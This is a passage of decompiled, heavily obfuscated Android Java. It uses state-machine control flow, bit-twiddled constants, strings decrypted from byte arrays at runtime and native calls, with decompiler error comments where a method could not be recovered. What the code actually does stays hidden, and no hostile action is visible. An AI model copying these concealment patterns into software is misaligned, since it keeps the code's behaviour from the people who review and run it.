                        long j16 = ((j15 >>> 2) | (j15 >>> 1)) & 858993459;
                        long j17 = ((j16 >>> 2) | j16) & 252645135;
                        long j18 = j7 & 43690;
                        long j19 = ((j18 >>> 2) | (j18 >>> 1)) & 858993459;
                        long j20 = ((j19 >>> 2) | j19) & 252645135;
                        long j21 = -2145375082;
                        long j22 = (int) ((((j20 >>> 4) | j20) & 16711935) | (((((j17 >>> 4) | j17) & 16711935) << 8) + j14));
                        long j23 = (((((((((j21 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j21 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j21 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j21 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j22 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j22 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j22 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j22 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                        long j24 = (j23 >>> 48) & 43690;
                        long j25 = ((j24 >>> 2) | (j24 >>> 1)) & 858993459;
                        long j26 = ((j25 >>> 2) | j25) & 252645135;
                        long j27 = (j23 >>> 32) & 43690;
                        long j28 = ((j27 >>> 2) | (j27 >>> 1)) & 858993459;
                        long j29 = ((j28 >>> 2) | j28) & 252645135;
                        long j30 = ((((j29 >>> 4) | j29) & 16711935) << 16) + ((((j26 >>> 4) | j26) & 16711935) << 24);
                        long j31 = (j23 >>> 16) & 43690;
                        long j32 = ((j31 >>> 2) | (j31 >>> 1)) & 858993459;
                        long j33 = ((j32 >>> 2) | j32) & 252645135;
                        long j34 = j23 & 43690;
                        long j35 = ((j34 >>> 2) | (j34 >>> 1)) & 858993459;
                        long j36 = ((j35 >>> 2) | j35) & 252645135;
                        bArr[(((int) ((((((j33 >>> 4) | j33) & 16711935) << 8) | j30) | (((j36 >>> 4) | j36) & 16711935))) + 306238016) ^ (-1839137081)] = -61;
                        bArr[18] = -70;
                        bArr[19] = 76;
                        bArr[20] = -46;
                        bArr[21] = -98;
                        bArr[22] = -116;
                        bArr[23] = -82;
                        bArr[24] = 51;
                        bArr[25] = -127;
                        bArr[26] = 33;
                        bArr[27] = -38;
                        bArr[28] = -46;
                        bArr[29] = 23;
                        long j37 = -845340091;
                        long j38 = (((((((((j37 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j37 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j37 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j37 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j6 + (j5 | j4) + 6148914691236517205L;
                        long j39 = (j38 >>> 48) & 43690;
                        long j40 = ((j39 >>> 2) | (j39 >>> 1)) & 858993459;
                        long j41 = ((j40 >>> 2) | j40) & 252645135;
                        long j42 = (j38 >>> 32) & 43690;
                        long j43 = ((j42 >>> 2) | (j42 >>> 1)) & 858993459;
                        long j44 = ((j43 >>> 2) | j43) & 252645135;
                        long j45 = ((((j44 >>> 4) | j44) & 16711935) << 16) | ((((j41 >>> 4) | j41) & 16711935) << 24);
                        long j46 = (j38 >>> 16) & 43690;
                        long j47 = ((j46 >>> 2) | (j46 >>> 1)) & 858993459;
                        long j48 = ((j47 >>> 2) | j47) & 252645135;
                        long j49 = j38 & 43690;
                        long j50 = ((j49 >>> 2) | (j49 >>> 1)) & 858993459;
                        long j51 = ((j50 >>> 2) | j50) & 252645135;
                        byte[] bArr2 = new byte[((((int) ((((j51 >>> 4) | j51) & 16711935) + (((((j48 >>> 4) | j48) & 16711935) << 8) | j45))) & 193170708) + 1075843585) ^ 1269014283];
                        bArr2[0] = -89;
                        bArr2[1] = 57;
                        bArr2[2] = -37;
                        bArr2[3] = -61;
                        bArr2[4] = 30;
                        bArr2[5] = -54;
                        bArr2[6] = 53;
                        bArr2[7] = -29;
                        bArr2[8] = -108;
                        bArr2[9] = -67;
                        bArr2[10] = -113;
                        bArr2[11] = 75;
                        bArr2[12] = 31;
                        bArr2[13] = 26;
                        bArr2[14] = 14;
                        bArr2[15] = 104;
                        bArr2[16] = Byte.MAX_VALUE;
                        bArr2[17] = -83;
                        bArr2[18] = -33;
                        bArr2[19] = 32;
                        bArr2[20] = -127;
                        bArr2[21] = -21;
                        bArr2[22] = -61;
                        bArr2[23] = -40;
                        bArr2[24] = 86;
                        bArr2[25] = -13;
                        bArr2[26] = 77;
                        bArr2[27] = -69;
                        bArr2[28] = -85;
                        bArr2[29] = 100;
                        x(bArr, bArr2);
                        p(new String(bArr, StandardCharsets.UTF_8).intern(), str);
                        return true;
                    }
                } else {
                    int nextInt = ThreadLocalRandom.current().nextInt();
                    byte b4 = (byte) nextInt;
                    byte b5 = (byte) (nextInt >>> 8);
                    str = AbstractC0089u1.h(BNatives.f3739a.ae(b4, b5), b4, b5, new C0013b0(this, 5));
                    if (str != null) {
                        c4 = 14250;
                    }
                }
                c4 = 50620;
            } else if (!str.isEmpty()) {
                c4 = 19639;
            } else {
                c4 = 50620;
            }
        }
    }

    /*  JADX ERROR: NullPointerException in pass: InitCodeVariables
        java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.SSAVar.getPhiList()" because "resultVar" is null
        	at jadx.core.dex.visitors.InitCodeVariables.collectConnectedVars(InitCodeVariables.java:119)
        	at jadx.core.dex.visitors.InitCodeVariables.setCodeVar(InitCodeVariables.java:82)
        	at jadx.core.dex.visitors.InitCodeVariables.initCodeVar(InitCodeVariables.java:74)
        	at jadx.core.dex.visitors.InitCodeVariables.initCodeVars(InitCodeVariables.java:48)
        	at jadx.core.dex.visitors.InitCodeVariables.visit(InitCodeVariables.java:29)
        */
    public final void U(android.content.Context r72) {
        /*
            Method dump skipped, instructions count: 3141
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: F0.C0017c0.U(android.content.Context):void");
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0040. Please report as an issue. */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v0 */
    /* JADX WARN: Type inference failed for: r0v1 */
    /* JADX WARN: Type inference failed for: r0v11, types: [java.lang.CharSequence, java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v12 */
    /* JADX WARN: Type inference failed for: r0v13 */
    /* JADX WARN: Type inference failed for: r0v2, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v4 */
    /* JADX WARN: Type inference failed for: r0v5 */
    /* JADX WARN: Type inference failed for: r0v6 */
    /* JADX WARN: Type inference failed for: r0v7 */
    /* JADX WARN: Type inference failed for: r0v8, types: [java.lang.Exception] */
    public final boolean V() {
        String e4 = 0;
        char c4 = 34871;
        boolean z3 = false;
        boolean z4 = false;
        while (true) {
            switch (c4) {
                case 24339:
                    String lowerCase = e4.toLowerCase(Locale.ROOT);
                    byte[] bArr = {-4, 88, -70, -77, 60, -61, -63, 78};
                    B(bArr, new byte[]{-105, 61, -56, -35, 89, -81, -78, 59});
                    Charset charset = StandardCharsets.UTF_8;
                    boolean contains = lowerCase.contains(new String(bArr, charset).intern());
                    byte[] bArr2 = {-118, -55, -42, 23};
                    B(bArr2, new byte[]{-3, -96, -70, 115, 0, -83, -38, D.a(1159734676, 3, -D1.a(1159734676, 273170473), 1) ^ (-1432905106)});
                    z3 = lowerCase.contains(new String(bArr2, charset).intern());
                    c4 = !contains ? (char) 44757 : (char) 43621;
                case 44757:
                    if (z3) {
                    }
                case 47630:
                    e4 = (Exception) e4;
                    c4 = 50378;
                case 57432:
                    e4 = e4;
                    c4 = 50378;
                case 16789:
                    return z4;
                case 43621:
                    byte[] bArr3 = new byte[28];
                    bArr3[0] = 23;
                    bArr3[1] = -7;
                    bArr3[2] = 100;
                    bArr3[3] = 104;
                    bArr3[4] = -5;
                    bArr3[5] = -110;
                    bArr3[6] = -54;
                    bArr3[7] = 110;
                    bArr3[8] = 59;
                    bArr3[9] = -122;
                    bArr3[10] = -85;
                    bArr3[11] = 15;
                    bArr3[12] = -104;
                    bArr3[13] = -80;
                    bArr3[14] = -63;
                    bArr3[15] = -110;
                    bArr3[16] = 32;
                    bArr3[17] = -99;
                    bArr3[18] = 53;
                    bArr3[19] = 118;
                    long j2 = -1;
                    long j3 = 0;
                    long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j6 = j5 | j4;
                    long j7 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j8 = j7 + j6;
                    long j9 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j10 = (((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j11 = (((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j12 = j11 + j10;
                    long j13 = (((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j14 = (((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j15 = j14 | j13 | j12;
                    long j16 = j15 + (j9 | j8);
                    long j17 = (j16 >>> 48) & 21845;
                    long j18 = ((j17 >>> 1) | j17) & 858993459;
                    long j19 = ((j18 >>> 2) | j18) & 252645135;
                    long j20 = (j16 >>> 32) & 21845;
                    long j21 = ((j20 >>> 1) | j20) & 858993459;
                    long j22 = ((j21 >>> 2) | j21) & 252645135;
                    long j23 = ((((j22 >>> 4) | j22) & 16711935) << 16) + ((((j19 >>> 4) | j19) & 16711935) << 24);
                    long j24 = (j16 >>> 16) & 21845;
                    long j25 = ((j24 >>> 1) | j24) & 858993459;
                    long j26 = ((j25 >>> 2) | j25) & 252645135;
                    long j27 = j16 & 21845;
                    long j28 = ((j27 >>> 1) | j27) & 858993459;
                    long j29 = ((j28 >>> 2) | j28) & 252645135;
                    int i = (((int) ((((j29 >>> 4) | j29) & 16711935) + ((((j26 >>> 4) | j26) & 16711935) << 8) + j23)) | (-1979592731)) & 1544388104;
                    long j30 = 555745616;
                    long j31 = j5 + j4;
                    long j32 = j7 | j31;
                    long j33 = (((((((((j30 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j30 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j30 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j30 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (j9 | j32) + 6148914691236517205L;
                    long j34 = (j33 >>> 48) & 43690;
                    long j35 = ((j34 >>> 2) | (j34 >>> 1)) & 858993459;
                    long j36 = ((j35 >>> 2) | j35) & 252645135;
                    long j37 = (j33 >>> 32) & 43690;
                    long j38 = ((j37 >>> 2) | (j37 >>> 1)) & 858993459;
                    long j39 = ((j38 >>> 2) | j38) & 252645135;
                    long j40 = ((((j39 >>> 4) | j39) & 16711935) << 16) + ((((j36 >>> 4) | j36) & 16711935) << 24);
                    long j41 = (j33 >>> 16) & 43690;
                    long j42 = ((j41 >>> 2) | (j41 >>> 1)) & 858993459;
                    long j43 = ((j42 >>> 2) | j42) & 252645135;
                    long j44 = j33 & 43690;
                    long j45 = ((j44 >>> 2) | (j44 >>> 1)) & 858993459;
                    long j46 = ((j45 >>> 2) | j45) & 252645135;
                    int i3 = (int) ((((j46 >>> 4) | j46) & 16711935) | (((((j43 >>> 4) | j43) & 16711935) << 8) + j40));
                    bArr3[(((i3 & i) * 2) + (i3 ^ i)) ^ 2100133708] = -44;
                    bArr3[21] = 18;
                    bArr3[22] = 11;
                    bArr3[23] = 90;
                    bArr3[24] = -39;
                    bArr3[25] = -12;
                    long j47 = j7 | j6;
                    long j48 = j9 | j47;
                    long j49 = j11 | j10;
                    long b4 = c3.b(j13, j49, j14, j48);
                    long j50 = (b4 >>> 48) & 21845;
                    long j51 = ((j50 >>> 1) | j50) & 858993459;
                    long j52 = ((j51 >>> 2) | j51) & 252645135;
                    long j53 = (b4 >>> 32) & 21845;
                    long j54 = ((j53 >>> 1) | j53) & 858993459;
                    long j55 = ((j54 >>> 2) | j54) & 252645135;
                    long j56 = ((((j55 >>> 4) | j55) & 16711935) << 16) + ((((j52 >>> 4) | j52) & 16711935) << 24);
                    long j57 = (b4 >>> 16) & 21845;
                    long j58 = ((j57 >>> 1) | j57) & 858993459;
                    long j59 = ((j58 >>> 2) | j58) & 252645135;
                    long j60 = b4 & 21845;
                    long j61 = ((j60 >>> 1) | j60) & 858993459;
                    long j62 = ((j61 >>> 2) | j61) & 252645135;
                    bArr3[(((((int) ((((j62 >>> 4) | j62) & 16711935) | (((((j59 >>> 4) | j59) & 16711935) << 8) + j56))) | 2065428390) & 135301800) + 1151942656) ^ 1287244466] = 125;
                    bArr3[27] = 104;
                    byte[] bArr4 = new byte[28];
                    long j63 = 555754313;
                    long j64 = (((((((((j63 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j63 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j63 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j63 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j9 + j32 + 6148914691236517205L;
                    long j65 = (j64 >>> 48) & 43690;
                    long j66 = ((j65 >>> 2) | (j65 >>> 1)) & 858993459;
                    long j67 = ((j66 >>> 2) | j66) & 252645135;
                    long j68 = (j64 >>> 32) & 43690;
                    long j69 = ((j68 >>> 2) | (j68 >>> 1)) & 858993459;
                    long j70 = ((j69 >>> 2) | j69) & 252645135;
                    long j71 = ((((j70 >>> 4) | j70) & 16711935) << 16) + ((((j67 >>> 4) | j67) & 16711935) << 24);
                    long j72 = (j64 >>> 16) & 43690;
                    long j73 = ((j72 >>> 2) | (j72 >>> 1)) & 858993459;
                    long j74 = ((j73 >>> 2) | j73) & 252645135;
                    long j75 = j64 & 43690;
                    long j76 = ((j75 >>> 2) | (j75 >>> 1)) & 858993459;
                    long j77 = ((j76 >>> 2) | j76) & 252645135;
                    bArr4[0] = 858650410 ^ (302896146 + ((int) ((((j77 >>> 4) | j77) & 16711935) + (((((j74 >>> 4) | j74) & 16711935) << 8) | j71))));
                    bArr4[1] = -112;
                    bArr4[2] = 10;
                    bArr4[3] = 12;
                    bArr4[4] = -88;
                    bArr4[5] = -25;
                    long j78 = j9 + j8 + j15;
                    long j79 = (j78 >>> 48) & 21845;
                    long j80 = ((j79 >>> 1) | j79) & 858993459;
                    long j81 = ((j80 >>> 2) | j80) & 252645135;
                    long j82 = (j78 >>> 32) & 21845;
                    long j83 = ((j82 >>> 1) | j82) & 858993459;
                    long j84 = ((j83 >>> 2) | j83) & 252645135;
                    long j85 = ((((j84 >>> 4) | j84) & 16711935) << 16) + ((((j81 >>> 4) | j81) & 16711935) << 24);
                    long j86 = (j78 >>> 16) & 21845;
                    long j87 = ((j86 >>> 1) | j86) & 858993459;
                    long j88 = ((j87 >>> 2) | j87) & 252645135;
                    long j89 = j78 & 21845;
                    long j90 = ((j89 >>> 1) | j89) & 858993459;
                    long j91 = ((j90 >>> 2) | j90) & 252645135;
                    int i4 = (int) ((((j91 >>> 4) | j91) & 16711935) | (((((j88 >>> 4) | j88) & 16711935) << 8) + j85));
                    int i5 = (671093873 - (i4 | 786620411)) + (786620379 | i4);
                    bArr4[1749671031 ^ ((1078577152 & i5) + (1078577152 | i5))] = -71;
                    bArr4[7] = 30;
                    bArr4[8] = 82;
                    bArr4[9] = -27;
                    bArr4[10] = -62;
                    bArr4[11] = 96;
                    bArr4[12] = -19;
                    bArr4[13] = -61;
                    bArr4[14] = -118;
                    long j92 = -308933414;
                    long j93 = (((((((((j92 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j92 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j92 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j92 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (j14 | (j13 + j49)) + 6148914691236517205L;
                    long j94 = (j93 >>> 48) & 43690;
                    long j95 = ((j94 >>> 2) | (j94 >>> 1)) & 858993459;
                    long j96 = ((j95 >>> 2) | j95) & 252645135;
                    long j97 = (j93 >>> 32) & 43690;
                    long j98 = ((j97 >>> 2) | (j97 >>> 1)) & 858993459;
                    long j99 = ((j98 >>> 2) | j98) & 252645135;
                    long j100 = ((((j99 >>> 4) | j99) & 16711935) << 16) + ((((j96 >>> 4) | j96) & 16711935) << 24);
                    long j101 = (j93 >>> 16) & 43690;
                    long j102 = ((j101 >>> 2) | (j101 >>> 1)) & 858993459;
                    long j103 = ((j102 >>> 2) | j102) & 252645135;
                    long j104 = j93 & 43690;
                    long j105 = ((j104 >>> 2) | (j104 >>> 1)) & 858993459;
                    long j106 = ((j105 >>> 2) | j105) & 252645135;
                    int i6 = ((int) ((((j106 >>> 4) | j106) & 16711935) + ((((j103 >>> 4) | j103) & 16711935) << 8) + j100)) & (-2096762164);
                    long j107 = 1241641508;
                    long j108 = ((((((((j107 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j107 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j107 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j107 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + j9 + j47;
                    long j109 = (j108 >>> 48) & 43690;
                    long j110 = ((j109 >>> 2) | (j109 >>> 1)) & 858993459;
                    long j111 = ((j110 >>> 2) | j110) & 252645135;
                    long j112 = (j108 >>> 32) & 43690;
                    long j113 = ((j112 >>> 2) | (j112 >>> 1)) & 858993459;
                    long j114 = ((j113 >>> 2) | j113) & 252645135;
                    long j115 = ((((j114 >>> 4) | j114) & 16711935) << 16) | ((((j111 >>> 4) | j111) & 16711935) << 24);
                    long j116 = (j108 >>> 16) & 43690;
                    long j117 = ((j116 >>> 2) | (j116 >>> 1)) & 858993459;
                    long j118 = ((j117 >>> 2) | j117) & 252645135;
                    long j119 = j108 & 43690;
                    long j120 = ((j119 >>> 2) | (j119 >>> 1)) & 858993459;
                    long j121 = ((j120 >>> 2) | j120) & 252645135;
                    bArr4[15] = (i6 + (((int) ((((j121 >>> 4) | j121) & 16711935) | (((((j118 >>> 4) | j118) & 16711935) << 8) | j115))) | 1482686752)) ^ 614075419;
                    bArr4[16] = 82;
                    bArr4[17] = -13;
                    bArr4[18] = 80;
                    bArr4[19] = 26;
                    bArr4[20] = -126;
                    bArr4[21] = 119;
                    bArr4[22] = 121;
                    bArr4[23] = 41;
                    bArr4[24] = -80;
                    bArr4[25] = -101;
                    bArr4[26] = 19;
                    bArr4[27] = 27;
                    B(bArr3, bArr4);
                    Charset charset2 = StandardCharsets.UTF_8;
                    String intern = new String(bArr3, charset2).intern();
                    StringBuilder sb = new StringBuilder();
                    byte[] bArr5 = new byte[13];
                    bArr5[0] = -84;
                    bArr5[1] = -99;
                    bArr5[2] = 78;
                    bArr5[3] = -80;
                    bArr5[4] = -4;
                    bArr5[5] = -84;
                    bArr5[6] = -121;
                    bArr5[7] = 112;
                    bArr5[8] = 80;
                    bArr5[9] = -45;
                    long j122 = -1837306562;
                    long j123 = j12 + j13;
                    long b5 = c3.b((((((((j122 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j122 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j122 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j122 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j123 + j14, 6148914691236517205L);
                    long j124 = (b5 >>> 48) & 43690;
                    long j125 = ((j124 >>> 2) | (j124 >>> 1)) & 858993459;
                    long j126 = ((j125 >>> 2) | j125) & 252645135;
                    long j127 = (b5 >>> 32) & 43690;
                    long j128 = ((j127 >>> 2) | (j127 >>> 1)) & 858993459;
                    long j129 = ((j128 >>> 2) | j128) & 252645135;
                    long j130 = ((((j129 >>> 4) | j129) & 16711935) << 16) + ((((j126 >>> 4) | j126) & 16711935) << 24);
                    long j131 = (b5 >>> 16) & 43690;
                    long j132 = ((j131 >>> 2) | (j131 >>> 1)) & 858993459;
                    long j133 = ((j132 >>> 2) | j132) & 252645135;
                    long j134 = b5 & 43690;
                    long j135 = ((j134 >>> 2) | (j134 >>> 1)) & 858993459;
                    long j136 = ((j135 >>> 2) | j135) & 252645135;
                    bArr5[((((int) ((((j136 >>> 4) | j136) & 16711935) + (((((j133 >>> 4) | j133) & 16711935) << 8) + j130))) & 542171152) + 50529312) ^ 592700474] = 115;
                    bArr5[11] = 55;
                    bArr5[12] = 90;
                    byte[] bArr6 = new byte[13];
                    bArr6[0] = -61;
                    bArr6[1] = -18;
                    bArr6[2] = 96;
                    bArr6[3] = -58;
                    bArr6[4] = -103;
                    bArr6[5] = -34;
                    long j137 = 1363497064;
                    long j138 = j14 | j123;
                    long j139 = ((((((((j137 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j137 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j137 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j137 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j138;
                    long j140 = (j139 >>> 48) & 43690;
                    long j141 = ((j140 >>> 2) | (j140 >>> 1)) & 858993459;
                    long j142 = ((j141 >>> 2) | j141) & 252645135;
                    long j143 = (j139 >>> 32) & 43690;
                    long j144 = ((j143 >>> 2) | (j143 >>> 1)) & 858993459;
                    long j145 = ((j144 >>> 2) | j144) & 252645135;
                    long j146 = ((((j145 >>> 4) | j145) & 16711935) << 16) + ((((j142 >>> 4) | j142) & 16711935) << 24);
                    long j147 = (j139 >>> 16) & 43690;
                    long j148 = ((j147 >>> 2) | (j147 >>> 1)) & 858993459;
                    long j149 = ((j148 >>> 2) | j148) & 252645135;
                    long j150 = j139 & 43690;
                    long j151 = ((j150 >>> 2) | (j150 >>> 1)) & 858993459;
                    long j152 = ((j151 >>> 2) | j151) & 252645135;
                    int i7 = ((int) ((((j152 >>> 4) | j152) & 16711935) | (((((j149 >>> 4) | j149) & 16711935) << 8) + j146))) + 3147924;
                    bArr6[6] = (((~i7) & (-1366644984)) - ((-1366644984) & i7)) + i7;
                    long j153 = j138 + j48;
                    long j154 = (j153 >>> 48) & 21845;
                    long j155 = ((j154 >>> 1) | j154) & 858993459;
                    long j156 = ((j155 >>> 2) | j155) & 252645135;
                    long j157 = (j153 >>> 32) & 21845;
                    long j158 = ((j157 >>> 1) | j157) & 858993459;
                    long j159 = ((j158 >>> 2) | j158) & 252645135;
                    long j160 = ((((j159 >>> 4) | j159) & 16711935) << 16) + ((((j156 >>> 4) | j156) & 16711935) << 24);
                    long j161 = (j153 >>> 16) & 21845;
                    long j162 = ((j161 >>> 1) | j161) & 858993459;
                    long j163 = ((j162 >>> 2) | j162) & 252645135;
                    long j164 = j153 & 21845;
                    long j165 = ((j164 >>> 1) | j164) & 858993459;
                    long j166 = ((j165 >>> 2) | j165) & 252645135;
                    int i8 = (int) ((((j166 >>> 4) | j166) & 16711935) + (((((j163 >>> 4) | j163) & 16711935) << 8) | j160));
                    long j167 = 1500720502;
                    long j168 = i8;
                    long j169 = (((((((((j167 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j167 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j167 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j167 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j168 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j168 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j168 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j168 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + 6148914691236517205L;
                    long j170 = (j169 >>> 48) & 43690;
                    long j171 = ((j170 >>> 2) | (j170 >>> 1)) & 858993459;
                    long j172 = ((j171 >>> 2) | j171) & 252645135;
                    long j173 = (j169 >>> 32) & 43690;
                    long j174 = ((j173 >>> 2) | (j173 >>> 1)) & 858993459;
                    long j175 = ((j174 >>> 2) | j174) & 252645135;
                    long j176 = ((((j175 >>> 4) | j175) & 16711935) << 16) | ((((j172 >>> 4) | j172) & 16711935) << 24);
                    long j177 = (j169 >>> 16) & 43690;
                    long j178 = ((j177 >>> 2) | (j177 >>> 1)) & 858993459;
                    long j179 = ((j178 >>> 2) | j178) & 252645135;
                    long j180 = j169 & 43690;
                    long j181 = ((j180 >>> 2) | (j180 >>> 1)) & 858993459;
                    long j182 = ((j181 >>> 2) | j181) & 252645135;
                    bArr6[((((int) ((((j182 >>> 4) | j182) & 16711935) + (((((j179 >>> 4) | j179) & 16711935) << 8) | j176))) & 354034256) + 10491048) ^ 364525311] = 25;
                    bArr6[8] = 63;
                    bArr6[9] = -67;
                    bArr6[10] = 83;
                    long j183 = 1133569072;
                    long j184 = ((((((((j183 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j183 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j183 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j183 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (j9 | (j31 + j7));
                    long j185 = (j184 >>> 48) & 43690;
                    long j186 = ((j185 >>> 2) | (j185 >>> 1)) & 858993459;
                    long j187 = ((j186 >>> 2) | j186) & 252645135;
                    long j188 = (j184 >>> 32) & 43690;
                    long j189 = ((j188 >>> 2) | (j188 >>> 1)) & 858993459;
                    long j190 = ((j189 >>> 2) | j189) & 252645135;
                    long j191 = ((((j190 >>> 4) | j190) & 16711935) << 16) | ((((j187 >>> 4) | j187) & 16711935) << 24);
                    long j192 = (j184 >>> 16) & 43690;
                    long j193 = ((j192 >>> 2) | (j192 >>> 1)) & 858993459;
                    long j194 = ((j193 >>> 2) | j193) & 252645135;
                    long j195 = j184 & 43690;
                    long j196 = ((j195 >>> 2) | (j195 >>> 1)) & 858993459;
                    long j197 = ((j196 >>> 2) | j196) & 252645135;
                    bArr6[1807345209 ^ (1755955744 + (((int) ((((j197 >>> 4) | j197) & 16711935) | (((((j194 >>> 4) | j194) & 16711935) << 8) | j191))) | 51389458))] = 13;
                    bArr6[12] = 122;
                    B(bArr5, bArr6);
                    sb.append(new String(bArr5, charset2).intern());
                    sb.append(e4);
                    try {
                        t(intern, sb.toString());
                        z4 = true;
                        c4 = 16789;
                    } catch (Exception e5) {
                        e4 = e5;
                        c4 = 47630;
                    }
                case 34871:
                    try {
                        byte[] bArr7 = new byte[10];
                        bArr7[0] = 72;
                        bArr7[1] = -125;
                        bArr7[2] = -34;
                        bArr7[3] = 111;
